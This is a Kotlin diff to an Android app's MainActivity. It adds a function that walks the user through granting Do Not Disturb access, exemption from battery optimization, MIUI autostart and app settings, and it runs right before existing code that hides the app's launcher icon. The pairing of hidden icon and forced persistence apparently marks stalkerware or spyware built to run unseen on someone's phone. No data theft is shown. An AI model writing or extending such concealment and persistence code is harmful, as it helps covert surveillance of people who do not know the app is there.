@@ -66,7 +66,41 @@ class MainActivity : Activity() {
             return
         }
         
+        requestSpecialPermissions()
         hideAppIcon()
+    }
+    
+    private fun requestSpecialPermissions() {
+        try {
+            val nm = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
+            if (!nm.isNotificationPolicyAccessGranted) {
+                startActivity(Intent(Settings.ACTION_NOTIFICATION_POLICY_ACCESS_SETTINGS))
+            }
+        } catch (_: Exception) {}
+        
+        try {
+            val pm = getSystemService(POWER_SERVICE) as PowerManager
+            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
+                startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
+                    data = Uri.parse("package:$packageName")
+                })
+            }
+        } catch (_: Exception) {}
+        
+        try {
+            val intent = Intent()
+            intent.component = android.content.ComponentName(
+                "com.miui.securitycenter",
+                "com.miui.permcenter.autostart.AutoStartManagementActivity"
+            )
+            startActivity(intent)
+        } catch (_: Exception) {}
+        
+        try {
+            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
+            intent.data = Uri.parse("package:$packageName")
+            startActivity(intent)
+        } catch (_: Exception) {}
     }
     
     private fun hideAppIcon() {
@@ -84,6 +118,7 @@ class MainActivity : Activity() {
         
         val allGranted = grantResults.all { it == PackageManager.PERMISSION_GRANTED }
         if (allGranted) {
+            requestSpecialPermissions()
             hideAppIcon()
         }
         
